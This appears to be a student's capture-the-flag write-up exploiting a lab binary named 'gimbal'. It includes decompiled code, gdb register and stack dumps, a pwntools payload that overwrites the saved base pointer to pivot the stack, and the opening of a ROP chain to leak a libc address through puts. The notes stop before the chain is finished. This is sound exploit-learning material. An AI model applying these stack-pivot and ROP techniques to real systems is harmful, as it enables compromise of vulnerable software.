###### First Run:
```
┌──(kali㉿kali)-[~/Desktop/6-Week/Gimbal]
└─$ ./gimbal   
what is your name?
Juneau
Wait, who were you again?
Nobody
kthxbye
```
Takes in two inputs then exits
###### Main:
```c
undefined8 main(EVP_PKEY_CTX *param_1)
{
  init(param_1);
  vuln();
  return 0;
}
```
###### Vuln Function:
```c
void vuln(void)
{
  long i;
  undefined8 *dPtr;
  undefined8 *namePtr;
  byte b;
  undefined8 data [1024];
  
  b = 0;
  puts("what is your name?");
  fgets((char *)data,0x1fff,stdin);
  dPtr = data;
  namePtr = &name;
  for (i = 0x400; i != 0; i = i + -1) {
    *namePtr = *dPtr;
    dPtr = dPtr + (ulong)b * -2 + 1;
    namePtr = namePtr + (ulong)b * -2 + 1;
  }
  do_it();
  return;
}
```
1) Allocates `1024` (`0x400`) bytes on the stack
2) Prints `"what is your name?"` on the stack using `puts`
3) Reads in `0x1fff` bytes of data from `stdin` into `data` local variable using `fgets`
4) Iterates through the first `0x400` bytes of `data` and moves into Global Variable `name`
5) Calls `do_it`
###### Do It:
```c
void do_it(void)
{
  undefined dat2 [32];
  
  puts("Wait, who were you again?");
  read(0,dat2,0x28);
  puts("kthxbye");
  return;
}
```
1) Allocates `32 (0x20)` bytes for the stack size
2) Prints message using `puts`
3) Takes in `0x20` bytes of dat from `stdin` using `read`
4) Prints another message using `puts`
5) Exits

So there is an overflow vulnerability here, but we only have 8 bytes, so all we can overwrite is the stack base pointer

# What does stuff look like in memory??
We get our bus error when `vuln` calls `leave`
`leave` does:
```
mov esp, ebp
pop ebp
```
And ebp is full of a's:
```
gef➤  info registers ebp
ebp            0x61616169          0x61616169
```


```
>>> print('A'*100)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
>>> print('B'*100)
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
```

Breaks:
```
0x4006e6 <vuln+48>        mov    edi, 0x601080 (Line after fgets)
0x0000000000400705 <+79>:    call   0x40067c <do_it>
0x00000000004006a4 <+40>:    call   0x400530 <read@plt>
0x00000000004006ae <+50>:    call   0x400520 <puts@plt>

```
##### `Breakpoint 1, 0x00000000004006e6 in vuln ()`
Break right after `fgets`
```
gef➤  break *0x004006e6
Breakpoint 1 at 0x4006e6
gef➤  r
Starting program: /home/kali/Desktop/6-Week/Gimbal/gimbal 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
what is your name?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x00000000004006e6 in vuln ()

$rax   : 0x00007fffffffbd90  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbx   : 0x00007fffffffdeb8  →  0x00007fffffffe22d  →  "/home/kali/Desktop/6-Week/Gimbal/gimbal"
$rcx   : 0x1f              
$rdx   : 0x65              
$rsp   : 0x00007fffffffbd90  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbp   : 0x00007fffffffdd90  →  0x00007fffffffdda0  →  0x0000000000000001
$rsi   : 0x00000000006042a1  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rdi   : 0x00007ffff7fa0a40  →  0x0000000000000000
$rip   : 0x00000000004006e6  →  <vuln+48> mov edi, 0x601080
$r8    : 0x0000000000604305  →  0x0000000000000000
$r9    : 0x410             
$r10   : 0x1000            
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x00007fffffffdec8  →  0x00007fffffffe255  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2d0  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]

0x00007fffffffbd90│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"    ← $rax, $rsp
0x00007fffffffbd98│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffbda0│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffbda8│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffbdb0│+0x0020: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffbdb8│+0x0028: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffbdc0│+0x0030: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffbdc8│+0x0038: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n"

     0x4006d9 <vuln+35>        mov    esi, 0x1fff
     0x4006de <vuln+40>        mov    rdi, rax
     0x4006e1 <vuln+43>        call   0x400550 <fgets@plt>
 →   0x4006e6 <vuln+48>        mov    edi, 0x601080
     0x4006eb <vuln+53>        lea    rax, [rbp-0x2000]
     0x4006f2 <vuln+60>        mov    edx, 0x400
     0x4006f7 <vuln+65>        mov    rsi, rax
```

##### `Breakpoint 2, 0x0000000000400705`
```
Breakpoint 2, 0x0000000000400705 in vuln ()

$rax   : 0x0               
$rbx   : 0x00007fffffffdeb8  →  0x00007fffffffe22d  →  "/home/kali/Desktop/6-Week/Gimbal/gimbal"
$rcx   : 0x0               
$rdx   : 0x400             
$rsp   : 0x00007fffffffbd90  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbp   : 0x00007fffffffdd90  →  0x00007fffffffdda0  →  0x0000000000000001
$rsi   : 0x00007fffffffdd90  →  0x00007fffffffdda0  →  0x0000000000000001
$rdi   : 0x0000000000603080  →  0x0000000000000000
$rip   : 0x0000000000400705  →  <vuln+79> call 0x40067c <do_it>
$r8    : 0x0000000000604305  →  0x0000000000000000
$r9    : 0x410             
$r10   : 0x1000            
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x00007fffffffdec8  →  0x00007fffffffe255  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2d0  →  0x0000000000000000

0x00007fffffffbd90│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"    ← $rsp
0x00007fffffffbd98│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffbda0│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffbda8│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffbdb0│+0x0020: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffbdb8│+0x0028: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffbdc0│+0x0030: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffbdc8│+0x0038: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n"

```
#### Break 3: `0x00000000004006a4`
```
gef➤  c
Continuing.
Wait, who were you again?

Breakpoint 3, 0x00000000004006a4 in do_it ()
$rax   : 0x0               
$rbx   : 0x00007fffffffdeb8  →  0x00007fffffffe22d  →  "/home/kali/Desktop/6-Week/Gimbal/gimbal"
$rcx   : 0x00007ffff7ec2b00  →  0x5877fffff0003d48 ("H="?)
$rdx   : 0x28              
$rsp   : 0x00007fffffffbd60  →  0x00007fffffffdeb8  →  0x00007fffffffe22d  →  "/home/kali/Desktop/6-Week/Gimbal/gimbal"
$rbp   : 0x00007fffffffbd80  →  0x00007fffffffdd90  →  0x00007fffffffdda0  →  0x0000000000000001
$rsi   : 0x00007fffffffbd60  →  0x00007fffffffdeb8  →  0x00007fffffffe22d  →  "/home/kali/Desktop/6-Week/Gimbal/gimbal"
$rdi   : 0x0               
$rip   : 0x00000000004006a4  →  <do_it+40> call 0x400530 <read@plt>
$r8    : 0x0000000000604305  →  0x0000000000000000
$r9    : 0x410             
$r10   : 0x1000            
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x00007fffffffdec8  →  0x00007fffffffe255  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2d0  →  0x0000000000000000

0x00007fffffffbd60│+0x0000: 0x00007fffffffdeb8  →  0x00007fffffffe22d  →  "/home/kali/Desktop/6-Week/Gimbal/gimbal"      ← $rsp, $rsi
0x00007fffffffbd68│+0x0008: 0x00007fffffffdeb8  →  0x00007fffffffe22d  →  "/home/kali/Desktop/6-Week/Gimbal/gimbal"
0x00007fffffffbd70│+0x0010: 0x00007fffffffdd90  →  0x00007fffffffdda0  →  0x0000000000000001
0x00007fffffffbd78│+0x0018: 0x0000000000000000
0x00007fffffffbd80│+0x0020: 0x00007fffffffdd90  →  0x00007fffffffdda0  →  0x0000000000000001     ← $rbp
0x00007fffffffbd88│+0x0028: 0x000000000040070a  →  <vuln+84> nop 
0x00007fffffffbd90│+0x0030: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffbd98│+0x0038: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"

     0x400697 <do_it+27>       mov    rsi, rax
     0x40069a <do_it+30>       mov    edi, 0x0
     0x40069f <do_it+35>       mov    eax, 0x0
 →   0x4006a4 <do_it+40>       call   0x400530 <read@plt>
   ↳    0x400530 <read@plt+0>     jmp    QWORD PTR [rip+0x200aea]        # 0x601020 <read@got.plt>
        0x400536 <read@plt+6>     push   0x1
        0x40053b <read@plt+11>    jmp    0x400510
        0x400540 <__libc_start_main@plt+0> jmp    QWORD PTR [rip+0x200ae2]        # 0x601028 <__libc_start_main@got.plt>
        0x400546 <__libc_start_main@plt+6> push   0x2
        0x40054b <__libc_start_main@plt+11> jmp    0x400510
```
#### Break 4 `0x00000000004006ae call   0x400520 <puts@plt>`
```
gef➤  break *0x00000000004006ae
Breakpoint 4 at 0x4006ae
gef➤  c
Continuing.
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Breakpoint 4, 0x00000000004006ae in do_it ()
$rax   : 0x28              
$rbx   : 0x00007fffffffdeb8  →  0x00007fffffffe22d  →  "/home/kali/Desktop/6-Week/Gimbal/gimbal"
$rcx   : 0x00007ffff7ec2a5d  →  0x5b77fffff0003d48 ("H="?)
$rdx   : 0x28              
$rsp   : 0x00007fffffffbd60  →  0x4242424242424242 ("BBBBBBBB"?)
$rbp   : 0x00007fffffffbd80  →  0x4242424242424242 ("BBBBBBBB"?)
$rsi   : 0x00007fffffffbd60  →  0x4242424242424242 ("BBBBBBBB"?)
$rdi   : 0x00000000004007ce  →  0x006579627868746b ("kthxbye"?)
$rip   : 0x00000000004006ae  →  <do_it+50> call 0x400520 <puts@plt>
$r8    : 0x0000000000604305  →  0x0000000000000000
$r9    : 0x410             
$r10   : 0x00007ffff7ddab08  →  0x0010001200001a3f
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x00007fffffffdec8  →  0x00007fffffffe255  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2d0  →  0x0000000000000000

0x00007fffffffbd60│+0x0000: 0x4242424242424242   ← $rsp, $rsi
0x00007fffffffbd68│+0x0008: 0x4242424242424242
0x00007fffffffbd70│+0x0010: 0x4242424242424242
0x00007fffffffbd78│+0x0018: 0x4242424242424242
0x00007fffffffbd80│+0x0020: 0x4242424242424242   ← $rbp
0x00007fffffffbd88│+0x0028: 0x000000000040070a  →  <vuln+84> nop 
0x00007fffffffbd90│+0x0030: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffbd98│+0x0038: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"

     0x40069f <do_it+35>       mov    eax, 0x0
     0x4006a4 <do_it+40>       call   0x400530 <read@plt>
     0x4006a9 <do_it+45>       mov    edi, 0x4007ce
 →   0x4006ae <do_it+50>       call   0x400520 <puts@plt>
   ↳    0x400520 <puts@plt+0>     jmp    QWORD PTR [rip+0x200af2]    # 0x601018 <puts@got.plt>
        0x400526 <puts@plt+6>     push   0x0
        0x40052b <puts@plt+11>    jmp    0x400510
        0x400530 <read@plt+0>     jmp    QWORD PTR [rip+0x200aea]    # 0x601020 <read@got.plt>
        0x400536 <read@plt+6>     push   0x1
        0x40053b <read@plt+11>    jmp    0x400510
```

Bus error at leave:
```
gef➤  c
Continuing.
kthxbye

Program received signal SIGBUS, Bus error.
0x000000000040070b in vuln ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x8               
$rbx   : 0x00007fffffffdeb8  →  0x00007fffffffe22d  →  "/home/kali/Desktop/6-Week/Gimbal/gimbal"
$rcx   : 0x00007ffff7ec2b00  →  0x5877fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007fffffffbd90  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbp   : 0x4242424242424242 ("BBBBBBBB"?)
$rsi   : 0x00007ffff7f9f803  →  0xfa0a30000000000a ("\n"?)
$rdi   : 0x00007ffff7fa0a30  →  0x0000000000000000
$rip   : 0x000000000040070b  →  <vuln+85> leave 
$r8    : 0x0000000000604305  →  0x0000000000000000
$r9    : 0x410             
$r10   : 0x00007ffff7ddab08  →  0x0010001200001a3f
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x00007fffffffdec8  →  0x00007fffffffe255  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2d0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffbd90│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"    ← $rsp
0x00007fffffffbd98│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffbda0│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffbda8│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffbdb0│+0x0020: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffbdb8│+0x0028: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffbdc0│+0x0030: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffbdc8│+0x0038: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400700 <vuln+74>        mov    eax, 0x0
     0x400705 <vuln+79>        call   0x40067c <do_it>
     0x40070a <vuln+84>        nop    
 →   0x40070b <vuln+85>        leave  
     0x40070c <vuln+86>        ret    
     0x40070d <main+0>         push   rbp
     0x40070e <main+1>         mov    rbp, rsp
     0x400711 <main+4>         mov    eax, 0x0
     0x400716 <main+9>         call   0x400657 <init>

```

What if I put the addr of `name` in as the last 8 bytes on the second piece of input data?
```python
def buildPld():
	pad = cyclic(32)
	addr = p64(0x00601080)
	pld = pad + addr
	return pld

def testPld():
	p = process('/bin/bash')
	p.sendline('gdb ./gimbal -q')
	p.sendline("break *0x004006a9")
	p.sendline("break *0x0040070b")
	p.sendline("r")
	p.recvuntil("name?")
	p.sendline('A'*10)
	p.recvuntil("again?")
	p.sendline(buildPld())
	p.interactive()
```

Right before `do_it` executes `leave`:
```
Breakpoint 4, 0x00000000004006b3 in do_it ()
[ Legend: Modified register | Code | Heap | Stack | String ]
 registers ────
$rax   : 0x8               
$rbx   : 0x00007fffffffdeb8  →  0x00007fffffffe22e  →  "/home/kali/Desktop/6-Week/Gimbal/gimbal"
$rcx   : 0x00007ffff7ec2b00  →  0x5877fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007fffffffbd60  →  0x6161616261616161 ("aaaabaaa"?)
$rbp   : 0x00007fffffffbd80  →  0x0000000000601080  →  "AAAAAAAAAA\n"
$rsi   : 0x00007ffff7f9f803  →  0xfa0a30000000000a ("\n"?)
$rdi   : 0x00007ffff7fa0a30  →  0x0000000000000000
$rip   : 0x00000000004006b3  →  <do_it+55> nop 
$r8    : 0x00000000006042ab  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x00007ffff7ddab08  →  0x0010001200001a3f
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x00007fffffffdec8  →  0x00007fffffffe256  →  "SHELL=/usr/bin/zsh"
$r14   : 0x0               
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2d0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
 stack ────
0x00007fffffffbd60│+0x0000: 0x6161616261616161     ← $rsp
0x00007fffffffbd68│+0x0008: 0x6161616461616163
0x00007fffffffbd70│+0x0010: 0x6161616661616165
0x00007fffffffbd78│+0x0018: 0x6161616861616167
0x00007fffffffbd80│+0x0020: 0x0000000000601080  →  "AAAAAAAAAA\n"     ← $rbp
0x00007fffffffbd88│+0x0028: 0x000000000040070a  →  <vuln+84> nop 
0x00007fffffffbd90│+0x0030: "AAAAAAAAAA\n"
0x00007fffffffbd98│+0x0038: 0x00000000000a4141 ("AA\n"?)
 code:x86:64 ────
     0x4006a4 <do_it+40>       call   0x400530 <read@plt>
     0x4006a9 <do_it+45>       mov    edi, 0x4007ce
●    0x4006ae <do_it+50>       call   0x400520 <puts@plt>
●→   0x4006b3 <do_it+55>       nop    
     0x4006b4 <do_it+56>       leave  
     0x4006b5 <do_it+57>       ret    
     0x4006b6 <vuln+0>         push   rbp
     0x4006b7 <vuln+1>         mov    rbp, rsp
     0x4006ba <vuln+4>         sub    rsp, 0x2000
 threads ────
[#0] Id 1, Name: "gimbal", stopped 0x4006b3 in do_it (), reason: BREAKPOINT
```

Right before `do_it` `ret`:
```
Breakpoint 5, 0x00000000004006b5 in do_it ()
$  
[ Legend: Modified register | Code | Heap | Stack | String ]
 registers ────
$rax   : 0x8               
$rbx   : 0x00007fffffffdeb8  →  0x00007fffffffe22e  →  "/home/kali/Desktop/6-Week/Gimbal/gimbal"
$rcx   : 0x00007ffff7ec2b00  →  0x5877fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007fffffffbd88  →  0x000000000040070a  →  <vuln+84> nop 
$rbp   : 0x0000000000601080  →  "AAAAAAAAAA\n"
$rsi   : 0x00007ffff7f9f803  →  0xfa0a30000000000a ("\n"?)
$rdi   : 0x00007ffff7fa0a30  →  0x0000000000000000
$rip   : 0x00000000004006b5  →  <do_it+57> ret 
$r8    : 0x00000000006042ab  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x00007ffff7ddab08  →  0x0010001200001a3f
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x00007fffffffdec8  →  0x00007fffffffe256  →  "SHELL=/usr/bin/zsh"
$r14   : 0x0               
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2d0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
 stack ────
0x00007fffffffbd88│+0x0000: 0x000000000040070a  →  <vuln+84> nop      ← $rsp
0x00007fffffffbd90│+0x0008: "AAAAAAAAAA\n"
0x00007fffffffbd98│+0x0010: 0x00000000000a4141 ("AA\n"?)
0x00007fffffffbda0│+0x0018: 0x0000000000000000
0x00007fffffffbda8│+0x0020: 0x0000000000000000
0x00007fffffffbdb0│+0x0028: 0x0000000000000000
0x00007fffffffbdb8│+0x0030: 0x0000000000000000
0x00007fffffffbdc0│+0x0038: 0x0000000000000000
 code:x86:64 ────
●    0x4006ae <do_it+50>       call   0x400520 <puts@plt>
●    0x4006b3 <do_it+55>       nop    
     0x4006b4 <do_it+56>       leave  
●→   0x4006b5 <do_it+57>       ret    
   ↳    0x40070a <vuln+84>        nop    
        0x40070b <vuln+85>        leave  
        0x40070c <vuln+86>        ret    
        0x40070d <main+0>         push   rbp
        0x40070e <main+1>         mov    rbp, rsp
        0x400711 <main+4>         mov    eax, 0x0

```

We can see the `ret` address at the top of the stack, which points to `0x40070a <vuln+84>  nop`
Under that, we start to see our `name` data

This is what it looks like  at the `leave` in `vuln`
```
Breakpoint 2, 0x000000000040070b in vuln ()
$  
[ Legend: Modified register | Code | Heap | Stack | String ]
 registers ────
$rax   : 0x8               
$rbx   : 0x00007fffffffdeb8  →  0x00007fffffffe22e  →  "/home/kali/Desktop/6-Week/Gimbal/gimbal"
$rcx   : 0x00007ffff7ec2b00  →  0x5877fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007fffffffbd90  →  "AAAAAAAAAA\n"
$rbp   : 0x0000000000601080  →  "AAAAAAAAAA\n"
$rsi   : 0x00007ffff7f9f803  →  0xfa0a30000000000a ("\n"?)
$rdi   : 0x00007ffff7fa0a30  →  0x0000000000000000
$rip   : 0x000000000040070b  →  <vuln+85> leave 
$r8    : 0x00000000006042ab  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x00007ffff7ddab08  →  0x0010001200001a3f
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x00007fffffffdec8  →  0x00007fffffffe256  →  "SHELL=/usr/bin/zsh"
$r14   : 0x0               
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2d0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
 stack ────
0x00007fffffffbd90│+0x0000: "AAAAAAAAAA\n"     ← $rsp
0x00007fffffffbd98│+0x0008: 0x00000000000a4141 ("AA\n"?)
0x00007fffffffbda0│+0x0010: 0x0000000000000000
0x00007fffffffbda8│+0x0018: 0x0000000000000000
0x00007fffffffbdb0│+0x0020: 0x0000000000000000
0x00007fffffffbdb8│+0x0028: 0x0000000000000000
0x00007fffffffbdc0│+0x0030: 0x0000000000000000
0x00007fffffffbdc8│+0x0038: 0x0000000000000000
 code:x86:64 ────
     0x400700 <vuln+74>        mov    eax, 0x0
     0x400705 <vuln+79>        call   0x40067c <do_it>
     0x40070a <vuln+84>        nop    
 →   0x40070b <vuln+85>        leave  
     0x40070c <vuln+86>        ret    
     0x40070d <main+0>         push   rbp
     0x40070e <main+1>         mov    rbp, rsp
     0x400711 <main+4>         mov    eax, 0x0
     0x400716 <main+9>         call   0x400657 <init>
 threads ────
[#0] Id 1, Name: "gimbal", stopped 0x40070b in vuln (), reason: BREAKPOINT

```

And here's what it looks like right before that return:
```
Breakpoint 1, 0x000000000040070c in vuln ()
[ Legend: Modified register | Code | Heap | Stack | String ]
 registers ────
$rax   : 0x8               
$rbx   : 0x00007fffffffdeb8  →  0x00007fffffffe22e  →  "/home/kali/Desktop/6-Week/Gimbal/gimbal"
$rcx   : 0x00007ffff7ec2b00  →  0x5877fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x0000000000601088  →  0x00000000000a4141 ("AA\n"?)
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00007ffff7f9f803  →  0xfa0a30000000000a ("\n"?)
$rdi   : 0x00007ffff7fa0a30  →  0x0000000000000000
$rip   : 0x000000000040070c  →  <vuln+86> ret 
$r8    : 0x00000000006042ab  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x00007ffff7ddab08  →  0x0010001200001a3f
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x00007fffffffdec8  →  0x00007fffffffe256  →  "SHELL=/usr/bin/zsh"
$r14   : 0x0               
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2d0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
 stack ────
0x0000000000601088│+0x0000: 0x00000000000a4141 ("AA\n"?)     ← $rsp
0x0000000000601090│+0x0008: <name+16> add BYTE PTR [rax], al
0x0000000000601098│+0x0010: <name+24> add BYTE PTR [rax], al
0x00000000006010a0│+0x0018: <name+32> add BYTE PTR [rax], al
0x00000000006010a8│+0x0020: <name+40> add BYTE PTR [rax], al
0x00000000006010b0│+0x0028: <name+48> add BYTE PTR [rax], al
0x00000000006010b8│+0x0030: <name+56> add BYTE PTR [rax], al
0x00000000006010c0│+0x0038: <name+64> add BYTE PTR [rax], al
 code:x86:64 ────
     0x400705 <vuln+79>        call   0x40067c <do_it>
     0x40070a <vuln+84>        nop    
     0x40070b <vuln+85>        leave  
●→   0x40070c <vuln+86>        ret    
[!] Cannot disassemble from $PC
 threads ────
[#0] Id 1, Name: "gimbal", stopped 0x40070c in vuln (), reason: BREAKPOINT

```

It's treating the data at `name + 8` as the next address.
It's worth noting that we can't execute any of the `name` data....so I guess we need to point it to a gadget

# Leaking LibC
Need to call the following:
1) `ret` to align the stack
2) `pop rdi; ret` - to move the address we want to leak into `rdi` so it can be an argument for `puts`
3) The address of the value we want to leak
4) `puts` the to call puts
5) A return address so there is no segfault after `puts` runs
		We will ignore this for now

###### `pop rdi; ret` gadget
```
┌──(kali㉿kali)-[~/Desktop/6-Week/Gimbal]
└─$ ROPgadget --binary gimbal | grep -i "pop rdi"   
0x0000000000400793 : pop rdi ; ret
```
###### `ret` gadget:
```
┌──(kali㉿kali)-[~/Desktop/6-Week/Gimbal]
└─$ ROPgadget --binary gimbal | grep -i ": ret"  
0x0000000000400501 : ret
```

LibC address - going with "puts":
```
gef➤  got

GOT protection: Partial RelRO | GOT functions: 5
[0x601018] puts@GLIBC_2.2.5  →  0x7ffff7e40b00
[0x601020] read@GLIBC_2.2.5  →  0x7ffff7ec2a50
[0x601028] __libc_start_main@GLIBC_2.2.5  →  0x7ffff7df2700
[0x601030] fgets@GLIBC_2.2.5  →  0x7ffff7e3ece0
[0x601038] setvbuf@GLIBC_2.2.5  →  0x7ffff7e412e0
gef➤  

```

Call to puts:
```
gef➤  info function .*@plt
All functions matching regular expression ".*@plt":

Non-debugging symbols:
0x0000000000400520  puts@plt
0x0000000000400530  read@plt
0x0000000000400540  __libc_start_main@plt
0x0000000000400550  fgets@plt
0x0000000000400560  setvbuf@plt
0x0000000000400570  __gmon_start__@plt
0x00007ffff7df1010  *ABS*+0x9e850@plt
0x00007ffff7df1020  *ABS*+0x9bc40@plt
0x00007ffff7df1030  realloc@plt

```


So now we can test with the first four addresses:
1) `ret` Gadget
	`0x00400501`
2) `pop rdi; ret` gadget
	`0x00400793`
3) LibC `puts` Address (GOT)
	`0x7ffff7e40b00`
4) PLT `puts` Address
	`00400520`

```
x /10xg 0x601000
```

